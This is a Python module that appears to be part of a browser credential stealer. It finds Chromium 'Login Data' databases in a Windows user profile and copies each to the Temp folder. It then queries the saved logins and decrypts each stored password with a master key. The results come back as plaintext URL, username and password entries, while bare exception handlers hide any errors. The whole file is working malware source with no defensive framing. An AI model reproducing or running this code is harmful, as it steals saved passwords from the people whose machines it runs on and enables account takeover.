import os
import shutil
from . import user, decrypt_password
import sqlite3

def get_login_data(path: str, profile: str, master_key):
    try:
        login_db = []
        files = os.listdir(path + "\\" + profile + "\\")
        for file in files:
            if 'Login Data' in file:
                full_path = os.path.join(path, profile, file)
                login_db.append(full_path)
        result = ""
        for file in login_db:
            shutil.copy(
                file, user+'\\AppData\\Local\\Temp\\login_db')
            try:
                conn = sqlite3.connect(
                    user + '\\AppData\\Local\\Temp\\login_db')
                cursor = conn.cursor()
                cursor.execute(
                    'SELECT origin_url, username_value, password_value FROM logins')
                for row in cursor.fetchall():
                    password = decrypt_password(row[2], master_key)
                    result += f"""
URL: {row[0]}
USER: {row[1]}
PASS: {password}

                    """
            except sqlite3.DatabaseError as e:
                pass
            finally:
                if conn:
                    conn.close()
                os.remove(user+'\\AppData\\Local\\Temp\\login_db')

        return result
    except:
        pass